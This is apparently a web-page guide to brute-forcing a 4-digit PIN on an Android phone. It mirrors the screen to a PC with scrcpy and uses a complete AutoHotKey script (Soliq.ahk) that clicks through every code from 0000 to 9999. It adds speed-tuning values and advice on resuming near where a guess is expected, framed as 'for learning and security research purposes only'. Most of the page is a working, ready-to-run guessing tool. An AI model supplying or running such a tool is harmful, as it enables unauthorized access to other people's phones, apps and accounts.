Password guessing simulation

A complete setup guide for automating 4-digit PIN testing using scrcpy for phone mirroring and AutoHotKey for click automation — for learning and security research purposes only.

1

Controlling your phone from PC

1.1 — Enable USB debugging
  • Redmi Note 8: open Settings → About Phone and tap MIUI Version exactly 7 times until you see "No need, you are already a developer."
  • Other devices: search online for how to enable Developer Mode for your specific model, then turn on USB Debugging inside Developer Options.
USB debugging must be enabled before connecting to scrcpy, otherwise your device won't be detected.
1.2 — Download and run scrcpy
  • Go to github.com/Genymobile/scrcpy
  • Press Ctrl + F, search for Get the app, then click the Windows download link.
  • Under "From the official release", download the 64-bit ZIP file.
  • Connect your phone via USB cable, open the ZIP folder, and double-click scrcpy.exe.
  • Your phone's screen will appear on your PC — you can now control it with your mouse.
2

Creating the AutoHotKey script

2.1 — Install AutoHotKey
  • Download and install the desktop application from autohotkey.com.
  • This runtime is required for any .ahk script file to execute on your machine.
2.2 — Create the AHK file
  • Create a new file named Soliq.ahk anywhere on your computer.
  • The file extension must be .ahk — this tells Windows to open it with AutoHotKey.
2.3 — Critical preparation step
  • Set the scrcpy window to fullscreen mode so screen coordinates stay stable.
  • Open the Calculator app on your phone — this is what you'll use to map button positions.
  • Open the AutoHotKey tray icon and select Window Spy from the menu.
Window Spy must have scrcpy as the active window while capturing — don't click anywhere else.
2.4 — Capture button coordinates
  • Hover your mouse over each digit button — 1 through 9, then 0 — one by one.
  • For each digit, read Mouse Position → Screen X and Y from Window Spy and write them down.
  • Also hover over the confirm / equals button and record those as CONFIRM_X and CONFIRM_Y.
2.5 — Paste coordinates into the script
  • Open Soliq.ahk in any text editor.
  • Replace the NX and NY array values with your recorded positions for digits 1–9, then 0.
  • Set CONFIRM_X and CONFIRM_Y to your confirm button coordinates.
  • To run the AHK script, simply double-click the saved .ahk file.
  • The script is now ready to use.
2.6 — Keyboard shortcuts
Win + R
Start the test
Begins from START_NUM
Win + S
Stop the test
Halts the loop immediately
2.7 — Speed tuning
  • Once working, reduce DELAY_MS and CLICK_DUR for faster execution.
  • Stable fast config: DELAY_MS = 120 and CLICK_DUR = 30.
2.8 — Resume from an estimate
  • Watch the script run and estimate roughly which number it has reached.
  • Set START_NUM slightly below your estimate and restart — no need to begin from 0000 every time.
Watch the on-screen typing — this makes it easy to narrow the range quickly.

4

Key parameters

DELAY_MS
Pause between each click in ms. Lower = faster.
CLICK_DUR
How long each mouse click is held down (ms).
START_NUM
Which PIN to start from. 0 means "0000".
END_NUM
Last PIN to try. Default is 9999.
NX / NY
Screen X and Y for digit buttons 1–9 and 0.
CONFIRM_X/Y
Screen coordinates of the confirm button.
5

Script — Soliq.ahk

Soliq.ahk
; ============================================================
;  NumPad Auto-Typer (0000–9999)
; ============================================================

; --- SETTINGS ---
OFFSET_X  := 0      ; X offset of keyboard's left edge on screen
OFFSET_Y  := 0      ; Y offset of keyboard's top edge on screen
DELAY_MS  := 420    ; pause between each click (ms)
START_NUM := 0      ; starting number
END_NUM   := 9999   ; ending number
CLICK_DUR := 70     ; click hold duration (ms)

; Confirm button coordinates
CONFIRM_X := 800
CONFIRM_Y := 400

; Digit button coordinates
;   1      2      3      4      5      6      7      8      9      0
NX := [800, 950, 1080, 800, 950, 1080, 800, 950, 1080, 940]
NY := [600, 600,  600, 720, 720,  720, 840, 840,  840, 970]

; --- CONTROLS ---
running := false
startNum := START_NUM

; Win+R → start
#r::
    if (running)
        return
    running := true
    SetTimer, TypeNumbers, -1
return

; Win+S → stop
#s::
    running := false
return

TypeNumbers:
    Loop, % (END_NUM - startNum + 1)
    {
        if (!running)
            return

        num := startNum + A_Index - 1

        ; Always 4-digit format: 0000, 0001, ...
        numStr := Format("{:04d}", num)

        ; Click each of the 4 digits
        Loop, 4
        {
            digit := SubStr(numStr, A_Index, 1)

            if (digit = "0")
                idx := 10
            else
                idx := digit + 0

            cx := OFFSET_X + NX[idx]
            cy := OFFSET_Y + NY[idx]

            MouseMove, %cx%, %cy%, 0
            Click
            Sleep, DELAY_MS
        }

        ; Click confirm button
        Sleep, DELAY_MS
        MouseMove, %CONFIRM_X%, %CONFIRM_Y%, 0
        Click
        Sleep, DELAY_MS * 2
    }

    running := false
return
